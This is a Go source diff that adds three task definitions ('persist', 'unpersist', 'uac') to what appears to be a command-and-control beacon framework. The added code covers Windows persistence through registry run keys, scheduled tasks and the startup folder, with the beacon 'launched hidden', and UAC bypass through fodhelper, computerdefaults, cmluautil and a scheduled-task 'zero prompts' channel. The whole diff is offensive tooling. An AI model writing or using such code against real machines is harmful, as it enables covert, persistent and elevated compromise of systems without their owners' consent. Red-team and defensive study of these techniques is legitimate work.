@@ -183,4 +183,60 @@ func init() {
 			}), nil
 		},
 	})
+
+	Register(&Spec{
+		Name:        "persist",
+		Description: "Establish persistence (registry run key, scheduled task, or startup folder)",
+		Args: []Arg{
+			{Name: "method", Required: true, Description: "reg | schtasks | startup"},
+			{Name: "name", Required: true, Description: "value / task / file name"},
+			{Name: "cmd", Description: "command to persist (default: the beacon itself, launched hidden)"},
+		},
+		Generate: func(p map[string]string) ([]byte, error) {
+			switch p["method"] {
+			case "reg", "schtasks", "startup":
+			default:
+				return nil, fmt.Errorf("ttp: persist method must be reg, schtasks or startup")
+			}
+			return obj(map[string]any{"method": p["method"], "name": p["name"], "cmd": p["cmd"]}), nil
+		},
+	})
+
+	Register(&Spec{
+		Name:        "unpersist",
+		Description: "Remove previously-created persistence",
+		Args: []Arg{
+			{Name: "method", Required: true, Description: "reg | schtasks | startup"},
+			{Name: "name", Required: true, Description: "value / task / file name"},
+		},
+		Generate: func(p map[string]string) ([]byte, error) {
+			switch p["method"] {
+			case "reg", "schtasks", "startup":
+			default:
+				return nil, fmt.Errorf("ttp: unpersist method must be reg, schtasks or startup")
+			}
+			return obj(map[string]any{"method": p["method"], "name": p["name"]}), nil
+		},
+	})
+
+	Register(&Spec{
+		Name:        "uac",
+		Description: "Run one elevated command without a UAC prompt (default: silent daily channel via UnifiedConsentSyncTask; falls back to the reusable schtasks task once bootstrapped)",
+		Args: []Arg{
+			{Name: "method", Description: "daily (default, zero prompts; first run waits for the daily sync task) | schtasks (one-time install prompt, then silent) | cmluautil | fodhelper | computerdefaults"},
+			{Name: "name", Description: "scheduled-task name for the built-in default command"},
+			{Name: "cmd", Description: "custom command to run elevated (captured output) — e.g. a schtasks /Create"},
+		},
+		Generate: func(p map[string]string) ([]byte, error) {
+			switch p["method"] {
+			case "", "daily", "schtasks", "cmluautil", "fodhelper", "computerdefaults":
+			default:
+				return nil, fmt.Errorf("ttp: uac method must be daily, schtasks, cmluautil, fodhelper or computerdefaults")
+			}
+			if p["cmd"] == "" && p["name"] == "" {
+				return nil, fmt.Errorf("ttp: uac requires cmd or name")
+			}
+			return obj(map[string]any{"method": p["method"], "name": p["name"], "cmd": p["cmd"]}), nil
+		},
+	})
 }
